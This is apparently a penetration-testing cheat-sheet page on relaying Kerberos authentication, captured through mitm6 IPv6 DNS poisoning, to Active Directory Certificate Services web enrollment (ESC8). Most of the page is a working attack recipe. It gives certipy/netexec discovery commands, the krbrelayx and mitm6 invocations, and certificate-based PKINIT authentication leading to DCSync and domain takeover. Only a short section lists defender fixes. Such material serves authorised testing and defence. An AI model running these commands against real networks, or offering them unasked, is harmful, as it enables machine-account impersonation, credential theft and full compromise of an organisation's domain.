**mitm6 Kerberos relay to ESC-8** — abuse IPv6 DNS spoofing (mitm6) to make a victim (ideally a Domain Controller or high-privileged computer account) authenticate over Kerberos to a name you control, then relay that authentication with krbrelayx to the AD CS web-enrollment endpoint. The result is a certificate for the relayed machine account → PKINIT → often SYSTEM / DCSync.

## Discovery

- Attacker on the same VLAN/subnet with IPv6 reachable on victims.
- AD CS with Web Enrollment (ESC8) and no EPA / channel binding on the HTTP endpoint.
- Confirm the CA / ESC8 exposure - see [ADCS Configuration Issues (ESC1-8)](../../ADCS%20Attacks/ADCS%20Configuration%20Issues%20%28ESC1-8%29.md):

```bash

certipy find -u 'USER_NAME@DOMAIN' -p 'USER_PASS' -dc-ip 'DC_IP' -stdout
# or
netexec ldap 'DC_IP' -u 'USER_NAME' -p 'USER_PASS' -M adcs

```

## Exploitation

Two terminals: krbrelayx targets the CA, mitm6 poisons DNS so the victim resolves an attacker-controlled name and authenticates via Kerberos.

1. Start the relay to the AD CS enrollment endpoint:

```bash

krbrelayx.py -t 'http://CA_FQDN/certsrv/' -ip 'ATTACKER_IP' --victim 'VICTIM_FQDN' --adcs --template 'Machine'

```

2. Start mitm6 (second terminal) to become the victim's DNS via rogue DHCPv6:

```bash

mitm6 -d 'DOMAIN' --host-allowlist 'VICTIM_FQDN'

```

**Note:** the relay target is set on **krbrelayx** (`-t`), not on mitm6 - mitm6 only poisons name resolution. Scoping with `--host-allowlist` avoids poisoning the whole subnet.

3. Wait for (or coerce) the victim's Kerberos `AP-REQ`; krbrelayx relays it and saves the issued certificate (e.g. `VICTIM$.pfx`).

4. Use the certificate with PKINIT to recover the NT hash / a TGT:

```bash

certipy auth -pfx './VICTIM$.pfx'
# then DCSync if it was a DC - see below

```

A DC machine-account certificate → DCSync → full domain compromise, see [Dump NTDS.dit](../../Credential%20Dumping/Dump%20NTDS.dit.md).

## Caution

- Noisy: rogue DHCPv6 + a flood of SOA/AAAA queries. Prefer `--host-allowlist` to limit blast radius.
- Defender fixes: disable IPv6 if unused or apply RA-Guard; enable EPA + require HTTPS on AD CS web enrollment.

## References

- Dirk-jan Mollema - Relaying Kerberos over DNS with krbrelayx and mitm6 - https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
- krbrelayx - https://github.com/dirkjanm/krbrelayx
- mitm6 - https://github.com/dirkjanm/mitm6

## See also

- [Kerberos Relay to ADCS](../Kerberos%20Relay/Kerberos%20Relay%20to%20ADCS.md) - the local / coerced / remote (non-mitm6) variants.
- [NTLM Relay to ADCS](../NTLM%20Relay/NTLM%20Relay%20to%20ADCS.md) - the NTLM ESC8 flow.
- [DHCP Poisoning](../NTLM%20Relay/DHCP%20Poisoning.md) - the IPv6/mitm6 front-end used here.
